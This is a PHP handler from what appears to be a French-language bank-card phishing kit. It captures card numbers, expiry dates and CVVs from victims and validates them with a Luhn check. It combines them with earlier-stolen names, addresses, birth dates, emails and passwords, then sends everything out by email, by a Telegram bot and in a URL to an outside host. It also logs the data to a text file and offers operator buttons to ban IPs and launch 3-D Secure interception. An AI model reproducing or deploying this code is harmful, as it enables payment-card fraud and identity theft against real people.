<?php
if (!isset($_SESSION)) {
session_start();
}
include '../../email.php';
include '../../antibots/antibots.php';
include '../../strom1.php';
include '../../infos.php';

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $_SESSION["c_num"]    = $_POST["c_num"];
    $_SESSION["exdate"]    = $_POST["exdate"];
    $_SESSION["csc"]    = $_POST["csc"];
	$cc = $_SESSION['c_num'];
	$bin=substr(str_replace(' ','',$_SESSION["c_num"]),0,6);
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch,CURLOPT_URL,"https://api.bincodes.com/bin/?format=json&api_key=46c4ea907d5ca3622fc3f7ff0593c209&bin=".$bin."&format=json");
	curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
	curl_setopt($ch,CURLOPT_TIMEOUT,400);
	$json=curl_exec($ch);
	$code=json_decode($json);
	$bin_scheme = $code->card;
	$bin_bank = $code->bank;
	$bin_type = $code->type;
	$bin_brand = $code->level;
	$bin_countrycode = $code->countrycode;
	$bin_url = parse_url(strtolower($code->website));
	$bin_phone = strtolower($code->phone);
	$bin_country = $code->country;

$filepath = '../../panel/stats.ini';
$data = @parse_ini_file($filepath);
$data['cc']++;
            function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === ""){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
update_ini_file($data, $filepath);	
	
	
	
$message = 'ㅤ
ㅤㅤㅤㅤㅤ[👩🏽‍⚖️] KIM CARD [👩🏽‍⚖️]

💳 Num carte : '.$_SESSION["c_num"].'
💳 Date Expiration : '.$_SESSION["exdate"].'
💳 Cryptogramme visuel : '.$_SESSION["csc"].'
🍓 Banque : '.$bin_bank.'
🍓 Niveau de la carte : '.$bin_brand.'
🍓 Type de carte : '.$bin_type.'

📱 Scan apple pay:

https://progamer-data.gay/ccscan/index.php?l='.$_SESSION["c_num"].'&p='.$_SESSION["exdate"].'&d='.$_SESSION["csc"].'

📞Nom : '.$_SESSION["name"].'
📞Prénom : '.$_SESSION["surname"].'
📞Date de naissance : '.$_SESSION["dob"].'
📞Adresse : '.$_SESSION["address"].'
📞Code Postal : '.$_SESSION["zipcode"].'
📞Ville : '.$_SESSION["city"].'
📞Numéro de téléphone : '.$_SESSION["tel"].'

💌Email : '.$_SESSION['email'].'
🔍Mot de passe rez : '.$_SESSION['pass'].'

🎯 IP : '._ip().'
ㅤ
';


$Subject="「💳」 +1 CC [$bin] • • $bin_bank • $bin_type • ".$_SESSION["dob"]." | "._ip();
$head="From: (っ◔◡◔)っDisneyMiauw 🍓 <cc@sdf.cash>";
$fil = fopen('./rez_txt/rez_cc.txt','a+');
function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}
if(is_valid_luhn($_SESSION["c_num"]) && is_numeric($_SESSION["c_num"])){
fwrite($fil, ''.$_SESSION["c_num"].'|'.$_SESSION["exdate"].'|'.$_SESSION["csc"].'| FULL INFO : '.$_SESSION["name"].'|'.$_SESSION["surname"].'|'.$_SESSION["address"].'|'.$_SESSION["tel"].'|'.$_SESSION["dob"]."\n");

$_SESSION['step_three']  = true;
mail($my_mail,$Subject,$message,$head);
$stats =''.$_SERVER['HTTP_HOST'].'/panel/panel.php';
$banip = ''.$_SERVER['HTTP_HOST'].'/functions/getban.php?ip='._ip().'';
$lancevbv = ''.$_SERVER['HTTP_HOST'].'/functions/actionvbv.php?ip='._ip().'';
	if($vbv){
		$html = file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$group_id.'&text='.urlencode("$message").'&reply_markup={"inline_keyboard": [[{"text": "Ban Ip", "url": "'.urlencode("$banip").'"},{"text": "Voir les stats", "url": "'.urlencode("$stats").'"}],[{"text": "Lancer le vbv", "url": "'.urlencode("$lancevbv").'"}]]}');
       	header('location: ../waiting.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));
   	}
    else{
		$html = file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$group_id.'&text='.urlencode("$message").'&reply_markup={"inline_keyboard": [[{"text": "Ban Ip", "url": "'.urlencode("$banip").'"},{"text": "Voir les stats", "url": "'.urlencode("$stats").'"}]]}');
  		header('location: ../merci.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));
    }
} else {
	header('location: ../card.php?error=true');   
}
}
else
{
  header('location: ../../../index.php');
} 
?>